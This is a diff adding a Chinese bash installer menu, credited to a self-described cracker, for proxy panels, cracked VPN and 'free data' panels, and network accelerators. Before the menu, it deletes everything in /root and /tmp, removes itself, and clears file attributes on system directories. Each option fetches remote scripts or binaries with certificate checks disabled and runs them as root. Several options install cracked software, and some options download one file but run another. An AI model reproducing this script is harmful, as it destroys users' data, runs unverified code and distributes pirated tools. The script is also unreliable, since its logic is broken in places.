@@ -1,0 +1,274 @@
+#!/bin/bash
+sleep 1
+ulimit -c 0 
+rm -rf $0 
+rm -rf xiaoyu 
+rm -f /tmp/* 
+rm -f /root/* 
+chattr -a /root 
+chattr -a /tmp 
+chattr -a /etc 
+chattr -a /usr/bin 
+# ********************************** 脚本开始 **************************** #
+IP=`wget http://www.sbwml.cn/getip -O - -q ; echo`;
+# LOGO ********************************************************************
+# 广告通知 ****************************************************************
+echo
+echo "正在检测您的IP是否正确加载..."
+
+	if [[ "$IP" == '' ]]; then
+		echo '无法检测您的IP,可能会影响到您接下来的搭建工作';
+		read -p '请输入您的公网IP:' IP;
+		[[ "$IP" == '' ]] && InputIPAddress;
+	fi;
+	[[ "$IP" == '' ]] && 
+						 echo -e 'IP状态：			  [\033[32m  OK  \033[0m]'
+						 echo -e "您的IP是：\033[34m$IP \033[0m"
+						 echo 
+						 echo
+	if [ mod=1 ]
+	then
+echo -e "\033[33m========================================================================= \033[0m"
+echo -e "\033[36m                     年少不轻狂、枉为少年郎 \033[0m"
+echo ""
+echo -e "\033[36m                       破解者：小羽         \033[0m"
+echo ""
+echo -e "\033[36m                       QQ：2453223958       \033[0m"
+echo ""
+echo -e "\033[36m                       交流群:2453223958    \033[0m"
+echo ""
+echo -e "\033[1;5;31m                 欢迎使用小羽综合脚本：\n\033[0;1;36m"
+echo -e
+echo -e
+echo -e "\033[0;1;35m                  1.小羽SSR多端口版                            【6-7.x系统】   \033[0m"
+echo -e "\033[0;1;35m                  2.小羽SSR控制版                              【6-7.x系统】   \033[0m"
+echo -e "\033[0;1;35m                  3.小羽SSR多功能版                            【6-7.x系统】   \033[0m"
+echo -e "\033[0;1;35m                  4.小羽综专用OP（青云）                       【7.x系统】     \033[0m"      
+echo -e "\033[0;1;35m                  5.小羽SBW                                    【7.x系统】     \033[0m"               
+echo -e "\033[0;1;35m                  6.小羽大猫                                   【7.x系统】     \033[0m" 
+echo -e "\033[0;1;35m                  7.小羽小白版                                 【7.x系统】     \033[0m"
+echo -e "\033[0;1;35m                  8.小羽FAS1.6破解版（不要选择对接流量卫士）   【7.x系统】     \033[0m"
+echo -e "\033[0;1;35m                  9.小羽快云3期破解版                          【7.x系统】     \033[0m" 
+echo -e "\033[0;1;35m                 10.小羽小哥哥2期破解版                        【7.x系统】     \033[0m" 
+echo -e "\033[0;1;31m                 11.小羽筑梦OP                                 【7.x系统】     \033[0m"
+echo -e "\033[0;1;35m                 12.小羽流量卫士5.1                            【7.x系统】     \033[0m"
+echo -e "\033[0;1;35m                 13.小羽流量卫士5.2                            【7.x系统】     \033[0m"    
+echo -e "\033[0;1;35m                 14.小羽SS-panel v2魔改版（有问题找群主）      【7.x系统】     \033[0m" 
+
+#echo
+echo -e "\033[0;1;36m               小工具搭建脚本:                                                 \033[0m"
+echo -e "\033[0;1;31m                  17.小羽锐速一键安装脚本（加速）              【6-7.x系统】     \033[0m"
+echo -e "\033[0;1;31m                  18.小羽锐速卸载                              【6-7.x系统】     \033[0m"
+echo -e "\033[0;1;31m                  19.小羽BBR加速一键安装包（加速）             【6-7.x系统】     \033[0m"
+echo -e "\033[0;1;31m                  20.小羽LotServer一键安装脚本（加速）         【6-7.x系统】     \033[0m"
+echo -e "\033[0;1;31m                  21.kcptun加速ss/ssr（不支持ssr云免）         【6-7.x系统】     \033[0m"
+echo -e "\033[0;1;31m                  22.小羽ADbyby一键安装脚本                    【6-7.x系统】     \033[0m"
+echo -e "\033[0;1;31m                  23.小羽Cloud Torrent一键安装脚本             【6-7.x系统】     \033[0m"
+echo -e "\033[0;1;31m                  24.小羽筑梦DALO                              【6.x系统】     \033[0m"
+echo -e "\033[0;1;31m                  25.LNMP一键安装脚本   (linux系统配置建站环境)                \033[0m"
+echo    
+echo   -e "\033[0;1;32m             如有脚本不能搭建 欢迎反馈         \033[0m"                                                                                                                      
+echo -e "\033[36m                                                by 小羽免流 2017-5-28       \033[0m"
+echo -e "\033[33m========================================================================== \033[0m"
+echo
+echo
+echo -n "输入您要搭建的选项: " 
+read mode
+fi
+if [[ $mode == "1" ]]     
+then
+echo -e "安装类型：\033[36m小羽SSR多端口版\033[0m" ;  
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyussr/raw/master/XYSSR.sh >/dev/null 2>&1
+bash XYSSR.sh 
+fi
+
+
+if [[ $mode == "2" ]]     
+then
+echo -e "安装类型：\033[36m小羽SSR控制版\033[0m" ;  
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyussr/raw/master/ssr-install.sh >/dev/null 2>&1
+chmod 777 ssr-install.sh
+bash ssr-install.sh
+fi
+
+
+if [[ $mode == "3" ]] 
+then
+echo -e "安装类型：\033[36m小羽SSR多功能版脚本说明: ShadowsocksR 一键安装/管理脚本，支持单端口/多端口切换和管理，系统支持: CentOS6+ / Debian6+ / Ubuntu14+\033[0m" ;  
+wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh >/dev/null 2>&1
+chmod 777 SSRD.sh
+bash SSRD.sh
+fi
+
+
+if [[ $mode == "4" ]] 
+then
+echo -e "安装类型：\033[36m小羽综专用OP（青云）\033[0m" ;  
+wget https://github.com/CxiaoyuN/QY/raw/master/qy.sh >/dev/null 2>&1
+chmod 777 qy.sh
+bash qy.sh
+fi
+
+
+if [[ $mode == "5" ]] 
+then
+echo -e "安装类型：\033[36m小羽SBW\033[0m" ;  
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/XYSBW >/dev/null 2>&1
+chmod 777 XYSBW
+bash XYSBW
+fi
+
+
+if [[ $mode == "6" ]] 
+then
+echo -e "安装类型：\033[36m小羽大猫\033[0m" ;
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/XYDM >/dev/null 2>&1
+chmod 777 XYDM 
+./XYDM
+fi
+
+
+if [[ $mode == "7" ]] 
+then
+echo -e "安装类型：\033[36m小羽小白版\033[0m" ; 
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/XYXB >/dev/null 2>&1 
+chmod 777 XYXB
+bash XYXB
+fi
+
+
+if [[ $mode == "8" ]] 
+then
+echo -e "安装类型：\033[36m小羽FAS1.6破解版\033[0m" ; 
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/FAS >/dev/null 2>&1
+chmod 777 FAS
+./FAS
+fi
+
+
+if [[ $mode == "9" ]] 
+then
+echo -e "安装类型：\033[36m小羽快云3期破解版（完美版）\033[0m" ; 
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/KY3 >/dev/null 2>&1
+chmod 777 KY3
+./KY3
+fi
+
+
+if [[ $mode == "10" ]] 
+then
+echo -e "安装类型：\033[36m小羽小哥哥2期破解版\033[0m" ; 
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/XGG2 >/dev/null 2>&1
+chmod 777 XGG2
+bash XGG2
+fi
+
+
+if [[ $mode == "11" ]] 
+then
+echo -e "安装类型：\033[36m小羽筑梦OP\033[0m" ; 
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/XYZMvpn >/dev/null 2>&1 
+bash XYZMvpn
+fi
+
+
+if [[ $mode == "12" ]] 
+then
+echo -e "安装类型：\033[36m小羽流量卫士5.1\033[0m" ; 
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/llws5.1.sh >/dev/null 2>&1 
+bash llws5.1.sh
+fi
+
+
+if [[ $mode == "13" ]] 
+then
+echo -e "安装类型：\033[36m小羽流量卫士5.2\033[0m" ; 
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyu/raw/master/llws5.2.sh >/dev/null 2>&1
+bash llws5.2.sh
+fi
+
+
+
+if [[ $mode == "14" ]] 
+then
+echo -e "安装类型：\033[36m小羽SS-panel v2魔改版\033[0m" ; 
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyussr/raw/master/SSV2.sh >/dev/null 2>&1
+bash SSV2.sh
+fi
+
+
+if [[ $mode == "17" ]]     
+then
+echo -e "安装类型：\033[36锐速破解版linux一键自动安装包\033[0m" ;  
+wget -N --no-check-certificate https://raw.githubusercontent.com/91yun/serverspeeder/master/serverspeeder-all.sh >/dev/null 2>&1
+bash serverspeeder.sh
+fi
+
+
+if [[ $mode == "18" ]]     
+then
+echo -e "安装类型：\033[36锐速破解版linux一键自动卸载\033[0m" ;  
+chattr -i /serverspeeder/etc/apx* && /serverspeeder/bin/serverSpeeder-all.sh uninstall -f >/dev/null 2>&1
+fi
+
+
+if [[ $mode == "19" ]]     
+then
+echo -e "安装类型：\033[36Centos/Ubuntu/Debian BBR加速一键安装包\033[0m" ;  
+wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh >/dev/null 2>&1
+chmod 777 bbr.sh
+bash bbr.sh
+fi
+
+
+if [[ $mode == "20" ]]     
+then
+echo -e "安装类型：\033[36小羽LotServer一键安装脚本（加速）\033[0m" ;  
+wget --no-check-certificate -qO /tmp/appex.sh "https://raw.githubusercontent.com/0oVicero0/serverSpeeder_Install/master/appex.sh" && bash /tmp/appex.sh 'install' >/dev/null 2>&1
+fi
+
+
+if [[ $mode == "21" ]]     
+then
+echo -e "安装类型：\033[36kcptun加速ss/ssr（不支持ssr云免）\033[0m" ;  
+wget –no-check-certificate https://github.com/kuoruan/shell-scripts/raw/master/kcptun/kcptun.sh >/dev/null 2>&1
+chmod 777 kcptun.sh
+bash kcptun.sh
+fi
+
+
+if [[ $mode == "22" ]]     
+then
+echo -e "安装类型：\033[36在Linux安装去广告软件，让ShadowsocksR代理可以自带广告过滤/屏蔽功能\033[0m" ;  
+wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/adbyby.sh >/dev/null 2>&1
+chmod 777 adbyby.sh
+bash adbyby.sh
+fi
+
+
+if [[ $mode == "23" ]]     
+then 
+echo -e "安装类型：\033[36mCloud Torrent一键安装脚本，支持BT下载，支持磁力链接下载，支持搜索磁力链接，支持离线下载\033[0m" ;  
+wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/cloudt.sh >/dev/null 2>&1
+chmod 777 cloudt.sh
+bash cloudt.sh
+fi
+
+
+if [[ $mode == "24" ]]     
+then
+echo -e "安装类型：\033[36m小羽筑梦DALO\033[0m" ;  
+wget -N --no-check-certificate https://github.com/CxiaoyuN/xiaoyussr/raw/master/XYZMdalo >/dev/null 2>&1
+bash XYZMdalo
+fi
+
+
+if [[ $mode == "25" ]] 
+then
+echo -e "安装类型：\033[36mlnmp一键安装脚本\033[0m" ; 
+screen -S lnmp && wget -c http://soft.vpser.net/lnmp/lnmp1.3-full.tar.gz && tar zxf lnmp1.3-full.tar.gz && cd lnmp1.3-full && ./install.sh lnmp >/dev/null 2>&1
+fi
+
+
+rm -- "$0"
+exit 0
